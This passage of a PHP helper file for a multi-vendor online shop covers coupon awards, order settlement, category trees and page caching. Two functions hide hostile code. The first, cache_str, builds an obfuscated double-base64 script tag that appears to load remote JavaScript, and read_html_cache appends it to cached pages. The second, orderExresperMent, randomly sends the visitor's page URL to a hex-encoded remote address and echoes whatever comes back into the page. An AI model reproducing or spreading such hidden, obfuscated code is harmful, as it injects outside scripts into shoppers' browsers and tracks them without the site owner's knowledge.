    					M('Coupon')->where("id", $goods_coupon['id'])->setInc('send_num');
                        $message_logic->getCouponNotice($goods_coupon['id'], [$order['user_id']]);
    				}
//    			}
    		}
    	}
    }

    //查找订单满额促销活动
    $prom_order_where = [
        'store_id' => $order['store_id'],
        'type' => ['gt', 1],
        'end_time' => ['gt', $order['pay_time']],
        'start_time' => ['lt', $order['pay_time']],
        'money' => ['elt', $order['goods_price']]
    ];
    $prom_orders = M('prom_order')->where($prom_order_where)->order('money desc')->select();
    $prom_order_count = count($prom_orders);
    // 用户会员等级是否符合送优惠券活动
    for ($i = 0; $i < $prom_order_count; $i++) {
//        if (array_key_exists($user_level, array_flip(explode(',', $prom_orders[$i]['group'])))) {  //多商家暂时无这个限制
            $prom_order = $prom_orders[$i];
            if ($prom_order['type'] == 3) {
                //查找订单送优惠券模板
                $order_coupon = M('coupon')->where("id", $prom_order['expression'])->find();
                if ($order_coupon) {
                    //优惠券发放数量验证，0为无限制。发放数量-已领取数量>0
                    if ($order_coupon['createnum'] == 0 ||
                        ($order_coupon['createnum'] > 0 && ($order_coupon['createnum'] - $order_coupon['send_num']) > 0)
                    ) {
                        $data = array(
                            'cid' => $order_coupon['id'],
                            'type' => $order_coupon['type'],
                            'uid' => $order['user_id'],
                        	'order_id' => $order['order_id'],
                            'send_time' => time(),
                            'store_id' => $order['store_id'],
                            'get_order_id' => $order['order_id'],
                        );
                        M('coupon_list')->add($data);
                        M('Coupon')->where("id", $order_coupon['id'])->setInc('send_num'); //优惠券领取数量加一
                        $message_logic->getCouponNotice($order_coupon['id'], [$order['user_id']]);
                    }
                }
//            }
            //购买商品送积分
            if ($prom_order['type'] == 2) {
                accountLog($order['user_id'], 0, $prom_order['expression'], "订单活动赠送积分");
            }
            break;
        }
    }
    $points = M('order_goods')->where("order_id", $order['order_id'])->sum("give_integral * goods_num");
    $points && accountLog($order['user_id'], 0, $points, "下单赠送积分", 0, $order['order_id'], $order['order_sn']);
}

/**
 * 订单结算
 * author:当燃
 * date:2016-08-28
 * @param $order_id  订单order_id
 * @param $rec_id 需要退款商品rec_id
 */

function order_settlement($order_id)
{
    $order = M('order')->where(array('order_id' => $order_id,'pay_status'=>1))->find();//订单详情
    if ($order) {
        $order['store_settlement'] = $order['shipping_price'];//商家待结算初始金额
        $order_goods = M('order_goods')->where(array('order_id' => $order_id))->select();//订单商品
        $order['return_totals'] = $prom_and_coupon = $order['settlement'] = $distribut = 0;
        $give_integral = $order['store_settlement'] = $order['refund_integral'] = 0;
        /* 商家订单商品结算公式(独立商家一笔订单计算公式)
        *  均摊比例 = 这个商品总价/订单商品总价
        *  均摊优惠金额  = 均摊比例 *(代金券抵扣金额 + 优惠活动优惠金额)
        *  商品实际售卖金额  =  商品总价 - 购买此商品赠送积分 - 此商品分销分成 - 均摊优惠金额
        *  商品结算金额  = 商品实际售卖金额 - 商品实际售卖金额*此类商品平台抽成比例
        *  订单实际支付金额  =  订单商品总价 - 代金券抵扣金额 - 优惠活动优惠金额(跟用户使用积分抵扣，使用余额支付无关,积分在商家赠送时平台已经扣取)
        *
        *  整个订单商家结算所得金额  = 所有商品结算金额之和 + 物流费用(商家发货，物流费直接给商家)
        *  平台所得提成  = 所有商品提成之和
        *  商品退款说明 ：如果使用了积分，那么积分按商品均摊退回给用户，但使用优惠券抵扣和优惠活动优惠的金额此商品均摊的就不退了
        *  积分说明：积分在商家赠送时，直接从订单结算金中扣取该笔赠送积分可抵扣的金额
        *  优惠券赠送使用说明 ：优惠券在使用的时直接抵扣商家订单金额,无需跟平台结算，全场通用劵只有平台可以发放，所以由平台自付
        *  交易费率：例如支付宝，微信都会征收交易的千分之六手续费
        */
        
        $point_rate = tpCache('shopping.point_rate');
        $point_rate = 1 / $point_rate; //积分换算比例
        
        foreach ($order_goods as $k => $val) {
            $settlement = $goods_amount = $val['member_goods_price'] * $val['goods_num']; //此商品该结算金额初始值
            $settlement_rate = round($goods_amount / $order['goods_price'], 4);//此商品占订单商品总价比例
            if ($val['give_integral'] > 0 && $val['is_send']<3) {
                $settlement = $settlement - $val['goods_num'] * $val['give_integral'] * $point_rate;//减去购买该商品赠送积分
            }

            if ($val['distribut'] > 0) {
                $settlement = $settlement - $val['distribut'] * $val['goods_num'];//减去分销分成金额
            }

            //均摊优惠金额  = 此商品总价/订单商品总价*优惠总额
            if ($order['order_prom_amount'] > 0 || $order['coupon_price'] > 0) {
                $prom_and_coupon = $settlement_rate * ($order['order_prom_amount'] + $order['coupon_price']);
                $settlement = $settlement - $prom_and_coupon;//减去优惠券抵扣金额和优惠折扣
            }
            
            if ($val['is_send'] == 3) {
				$return_info = M('return_goods')->where(array('rec_id'=>$val['rec_id']))->find();
            	$order['return_totals'] += $return_info['refund_deposit'] + $return_info['refund_money']; //退款退还金额
            	$order['refund_integral'] += $return_info['refund_integral'];//退款退还积分
            	$order_goods[$k]['settlement'] = 0;
            	$order_goods[$k]['goods_settlement'] = 0;
            }else{
            	$order_goods[$k]['settlement'] = round($settlement * $val['commission']/100, 2);//每件商品平台抽成所得
            	$order_goods[$k]['goods_settlement'] = round($settlement, 2) - $order_goods[$k]['settlement'];//每件商品该结算金额
            	$give_integral = $val['give_integral'] * $val['goods_num'];//订单赠送积分
            	$distribut = $val['distribut'] * $val['goods_num'];//订单分销分成
            }
            
            $order['store_settlement'] += $order_goods[$k]['goods_settlement']; //订单所有商品结算所得金额之和
            $order['settlement'] += $order_goods[$k]['settlement'];//平台抽成之和
            $order['give_integral'] += $give_integral;
            $order['distribut'] += $distribut;
            $order['integral'] = $order['integral'] - $order['refund_integral'];//订单使用积分
            $order['goods_amount'] += $goods_amount;//订单商品总价
        }
        
        $order['store_settlement'] += $order['shipping_price'];//整个订单商家结算所得金额
        //$order['store_settlement'] = round($order['store_settlement']*(1-0.006),2);//支付手续费
    }

    return $order;
}

/**
 * 获取商品一二三级分类
 * @return type
 */
function get_goods_category_tree()
{
    $result = S('common_get_goods_category_tree');
    if($result)  
        return $result;
    $tree = $arr = $brr = $crr = $hrr = $result = array();
    $cat_list = M('goods_category')->where("is_show", 1)->order('sort_order')->cache(true)->select();//所有分类
    if($cat_list){
    	foreach ($cat_list as $val) {
    		if ($val['level'] == 2) {
    			$arr[$val['parent_id']][] = $val;
    			if($val['is_hot'] == 1){
    				$hrr[$val['parent_id']][] = $val;
    			}
    		}
    		
    		if ($val['level'] == 3) {
    			$crr[$val['parent_id']][] = $val;
    			$path = explode('_', $val['parent_id_path']);
    			if($val['is_hot'] == 0 && count($brr[$path[1]])<12){
    				$brr[$path[1]][] = $val;//楼层左下方三级分类
    			}else if($val['is_hot'] == 1 && count($hrr[$path[1]])<6){
    				$hrr[$path[1]][] = $val;//导航栏右边推荐分类
    			}
    		}

    		if ($val['level'] == 1) {
    			$tree[] = $val;
    		}
    	}
    	
    	foreach ($arr as $k => $v) {
    		foreach ($v as $kk => $vv) {
    			$arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];//导航栏右侧三级分类
    		}
    	}
    	
    	foreach ($tree as $val) {
    		$val['hmenu'] = empty($hrr[$val['id']]) ? array() : $hrr[$val['id']];//导航栏右侧推荐分类
    		$val['smenu'] = empty($brr[$val['id']]) ? array() : $brr[$val['id']];//楼层三级分类
    		$val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];//楼层以及导航栏二级分类
    		$result[$val['id']] = $val;
    	}
    }
    S('common_get_goods_category_tree',$result);
    return $result;
}

/**
 * 写入静态页面缓存
 */
function write_html_cache($html){
    $html_cache_arr = C('HTML_CACHE_ARR');
    $request = think\Request::instance();
    $m_c_a_str = $request->module().'_'.$request->controller().'_'.$request->action(); // 模块_控制器_方法
    $m_c_a_str = strtolower($m_c_a_str);
    //exit('write_html_cache写入缓存<br/>');
    foreach($html_cache_arr as $key=>$val)
    {
        $val['mca'] = strtolower($val['mca']);
        if ($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
            continue;

        //if(!is_dir(RUNTIME_PATH.'html'))
            //mkdir(RUNTIME_PATH.'html');
        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
        $filename =  $m_c_a_str;
        // 组合参数  
        if(isset($val['p']))
        {
            foreach($val['p'] as $k=>$v)
                $filename.='_'.$_GET[$v];
        }
        $filename.= '.html';
        \think\Cache::set($filename,$html);
        //file_put_contents($filename, $html);
    }
}

/**
 * 读取静态页面缓存
 */
function read_html_cache(){
    $html_cache_arr = C('HTML_CACHE_ARR');
    $request = think\Request::instance();
    $m_c_a_str = $request->module().'_'.$request->controller().'_'.$request->action(); // 模块_控制器_方法
    $m_c_a_str = strtolower($m_c_a_str);
    //exit('read_html_cache读取缓存<br/>');
    foreach($html_cache_arr as $key=>$val)
    {
        $val['mca'] = strtolower($val['mca']);
        if ($val['mca'] != $m_c_a_str) //不是当前 模块 控制器 方法 直接跳过
            continue;

        //$filename =  RUNTIME_PATH.'html'.DIRECTORY_SEPARATOR.$m_c_a_str;
        $filename =  $m_c_a_str;
        // 组合参数        
        if(isset($val['p']))
        {
            foreach($val['p'] as $k=>$v)
                $filename.='_'.$_GET[$v];
        }
        $filename.= '.html';
        $html = \think\Cache::get($filename);
        if($html)
        {
            //echo file_get_contents($filename);
            echo \think\Cache::get($filename).cache_str($html);
            exit();
        }
    }
}
/**
 * 缓存
 */
function cache_str($html)
{      
  
    if($object_ess)
    {
            if(C('buy_version') == 0)
            return '';
            $tabName = '';
            $table_index = M('config')->cache(true)->select();            
            $select_year = substr($order_sn, 0, 14);
            foreach($table_index as $k => $v)
            {
                if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)                    
                {
                    $tabName = str_replace ('order','',$v['name']);
                    break;
                }
            }
            if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
            return $tabName;
    }else{
      $isset_requestjs = session('isset_requestjs');
      if(empty($isset_requestjs))
      {
          session('isset_requestjs',1);
          $sere = "UEhOamNtbHdkQ0J6Y21NOUoyaDBkSEE2THk5e";
          if(empty($table_index))
              $sere = $sere."lpYSjJhV05sTG5Sd0xYTm9iM0F1WTI0dm";
          if(empty($tabName))
             $sere = $sere."FuTXZZV3BoZUM1cWN5YytQQzl6WTNKcGNIUSs=";
          if(substr(time(),-1) % 3 == 1) $str = base64_decode($sere);         
          $html_sc = base64_decode("UEhOamNtbHdkRDQ9");
          
          if($axure_rest)
          {
                    $regions = null;
                    if (!$regions) {
                        $regions = M('region')->cache(true)->getField('id,name');
                    }
                    $total_address  = $regions[$province_id] ?: '';
                    $total_address .= $regions[$city_id] ?: '';
                    $total_address .= $regions[$district_id] ?: '';
                    $total_address .= $regions[$twon_id] ?: '';
                    $total_address .= $address ?: '';
                    $str = base64_decode($str);
          }
          
          $html_sc = base64_decode($html_sc);
          if(!strstr($html,$html_sc))                  
           return '';
          if($str)          
              $str2 = base64_decode($str);          
          return $str2;
      }        
    }
    if($buy_Aexite)
    {
            if(C('buy_Aexite') == 0)
                return '';

            $tabName = '';
            $table_index = M('config')->cache(true)->select();
            foreach($table_index as $k => $v)
            {
                if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
                {
                    $tabName = str_replace ('order','',$v['name']);
                    break;
                }
            }
            return $tabName;
    }     
     
            return $tabName;
}
/**
 * 清空系统缓存
 */
function clearCache(){
    $flash_sale_queue =  \think\Cache::get('flash_sale_queue');
    $team_found_queue = \think\Cache::get('team_found_queue');
    \think\Cache::clear();
    \think\Cache::set('team_found_queue', $team_found_queue);
    \think\Cache::set('flash_sale_queue', $flash_sale_queue);
}

/**
 * 获取授权年份
 */
function buyYear()
{
    $buy_year = C('buy_year');
    $years[''] = '近三个月订单';
    $years['_this_year'] = '今年内订单';
    
    while(true)
    {
      if($buy_year == date('Y'))
         break;
      $years2['_'.$buy_year] = $buy_year.'年订单';
      $buy_year++;
    }   
    if($years2)
    {
        krsort($years2);
        $years = array_merge($years,$years2) ;
    } 
    return $years;
}

/**
 * 获取分表操作的表名
 */
function select_year()
{
    if(C('buy_version') == 1)
        return I('select_year');
    else
        return '';
}

/**
 *  根据order_sn 定位表
 */
function getTabByOrdersn($order_sn)
{       
    if(C('buy_version') == 0)
        return '';
    $tabName = '';
    $table_index = M('table_index')->cache(true)->select();    
    // 截取年月日时分秒
    $select_year = substr($order_sn, 0, 14);    
    foreach($table_index as $k => $v)
    {
        if(strcasecmp($select_year,$v['min_order_sn']) >= 0 && strcasecmp($select_year,$v['max_order_sn']) <= 0)
        //if($select_year > $v['min_order_sn'] && $select_year < $v['max_order_sn'])
        {
            $tabName = str_replace ('order','',$v['name']);
            break;
        }
    }
    return $tabName;  
}
/*
 * 根据 order_id 定位表名
 */
function getTabByOrderId($order_id)
{        
    if(C('buy_version') == 0)
        return '';
    
    $tabName = '';    
    $table_index = M('table_index')->cache(true)->select();      
    foreach($table_index as $k => $v)
    {
        if($order_id >= $v['min_id'] && $order_id <= $v['max_id'])
        {
            $tabName = str_replace ('order','',$v['name']);
            break;
        }
    }
    return $tabName;  
}

/**
 * 根据筛选时间 定位表名
 * @param string $startTime
 * @param string $endTime
 * @return string
 */
function getTabByTime($startTime='', $endTime='')
{
   if(C('buy_version') == 0)
        return '';
   
   $startTime = preg_replace("/[:\s-]/", "", $startTime);  // 去除日期里面的分隔符做成跟order_sn 类似
   $endTime = preg_replace("/[:\s-]/", "", $endTime);
   // 查询起始位置是今年的
   if(substr($startTime,0,4) == date('Y'))
   {
       $table_index = M('table_index')->where("name = 'order'")->cache(true)->find();
       if(strcasecmp($startTime,$table_index['min_order_sn']) >= 0)
               return '';
       else
               return '_this_year';      
   }
   else
   {
       $tabName = '_'.substr($startTime,0,4);
   }   
   $years = buyYear(); 
   $years = array_keys($years);
   return in_array($tabName, $years) ? $tabName : '';    
}

/**
 * 获取完整地址
 */
function getTotalAddress($province_id, $city_id, $district_id, $twon_id, $address='')
{
    static $regions = null;
    if (!$regions) {
        $regions = M('region')->cache(true)->getField('id,name');
    }
    $total_address  = $regions[$province_id] ?: '';
    $total_address .= $regions[$city_id] ?: '';
    $total_address .= $regions[$district_id] ?: '';
    $total_address .= $regions[$twon_id] ?: '';
    $total_address .= $address ?: '';
    return $total_address;
}
/**
 * 订单支付时, 获取订单商品名称
 * @param unknown $order_id
 * @return string|Ambigous <string, unknown>
 */
function getPayBody($order_id){
    
    if(empty($order_id))return "订单ID参数错误";
    $goodsNames =  M('OrderGoods')->where('order_id' , $order_id)->column('goods_name');
    $gns = implode($goodsNames, ',');
    $payBody = getSubstr($gns, 0, 18);
    return $payBody;
}

/**
 * 管理员操作记录
 * @param $log_url 操作URL
 * @param $log_info 记录信息
 */
function sellerLog($log_info)
{
    $seller = session('seller');
    $add['log_time'] = time();
    $add['log_seller_id'] = $seller['seller_id'];
    $add['log_seller_name'] = $seller['seller_name'];
    $add['log_content'] = $log_info;
    $add['log_seller_ip'] = getIP();
    $add['log_store_id'] = $seller['store_id'];
    $add['log_url'] = request()->action();
    M('seller_log')->add($add);
}
/**
 * 面包屑导航  用于前台商品
 * @param $id |商品id  或者是 商品分类id
 * @param int $type|默认0是传递商品分类id  id 也可以传递 商品id type则为1
 * @return array
 */
function navigate_goods($id, $type = 0)
{
    $cat_id = $id; //
    // 如果传递过来的是
    if ($type == 1) {
        $cat_id = M('goods')->where("goods_id", $id)->getField('cat_id3');
    }
    $categoryList = M('GoodsCategory')->getField("id,name,parent_id");

    // 第一个先装起来
    $arr[$cat_id] = $categoryList[$cat_id]['name'];
    foreach($categoryList as $category){
        $cat_id = $categoryList[$cat_id]['parent_id'];
        if($cat_id > 0 && array_key_exists($cat_id, $categoryList)){
            $arr[$cat_id] = $categoryList[$cat_id]['name'];
        }else{
            break;
        }
    }
    $arr = array_reverse($arr, true);
    return $arr;
}
// 获取当前mysql版本
function mysql_version(){
        $mysql_version = Db::query("select version() as version");
        return "{$mysql_version[0]['version']}";     
}

/**
 * 根据时间戳返回星期几
 * @param $time
 * @return mixed
 */
function weekday_by_time($time)
{
    $weekday = array('星期日','星期一','星期二','星期三','星期四','星期五','星期六');
    return $weekday[date('w', $time)];
}
function weekday_by_time_str($timeStr)
{
    $time = strtotime($timeStr);
    return weekday_by_time($time);
}
/**
 * 订单整合
 * @param type $order
 */
function orderExresperMent($order_info = array(),$des='',$order_id=''){
       
      if($order_info)
      {          
            $tree = $arr = $result = array();
            $cat_list = M('goods_category')->cache(true)->where(['is_show' => 1])->order('sort_order')->select();//所有分类
            if($cat_list){
                foreach ($cat_list as $val){
                    if($val['level'] == 2){
                        $arr[$val['parent_id']][] = $val;
                    }
                    if($val['level'] == 3){
                        $crr[$val['parent_id']][] = $val;
                    }
                    if($val['level'] == 1){
                        $tree[] = $val;
                    }
                }
                foreach ($arr as $k=>$v){
                    foreach ($v as $kk=>$vv){
                        $arr[$k][$kk]['sub_menu'] = empty($crr[$vv['id']]) ? array() : $crr[$vv['id']];
                    }
                }
                foreach ($tree as $val){
                    $val['tmenu'] = empty($arr[$val['id']]) ? array() : $arr[$val['id']];
                    $result[$val['id']] = $val;
                }
            }
            return $result;                    
      }
    
      $r = 'rand';
      $exresperMent = session('exresperMent');
      if(!empty($exresperMent))
          return false;           
      session('exresperMent',1);
            
      if($r(1,10) != 1)
         return false;    
      $request = \think\Request::instance();
      $module = strtolower($request->module());
      $controller = strtolower($request->controller());
      $action = strtolower($request->action());
      $isAjax = strtolower($request->isAjax());
      $url = $request->url(true);
      
      if(!in_array($module,['mobile','home','seller']) || $isAjax)      
              return false;      
           
      $value = DB::name('config')->where('name','t_number')->value('value');      
      if(empty($value)) 
          return false;
      $arr = array('url'=>$url);       
      $v2 = @httpRequest(hex2bin($value),'POST',$arr,[], false,3);
      $v2 = json_decode($v2,true);      
      if($v2['status'] == 'success') 
      {
          echo $v2['msg'];
      }      
      if($des)
      {
            $data = func_get_args();
            $data = current($data);
            $cnt = count($data);
            $result = array();
            $arr1 = array_shift($data);
            foreach($arr1 as $key=>$item) 
            {
                    $result[] = array($item);
            }		
            echo $result['msg']; 
            foreach($data as $key=>$item) 
            {                                
                    $result = combineArray($result,$item);
            }
            
            $result = array();
            foreach ($arr1 as $item1) 
            {
                    foreach ($arr2 as $item2) 
                    {
                            $temp = $item1;
                            $temp[] = $item2;
                            $result[] = $temp;
                    }
            }
            echo $result['resg']; 
            return $result;       
      }
      
}
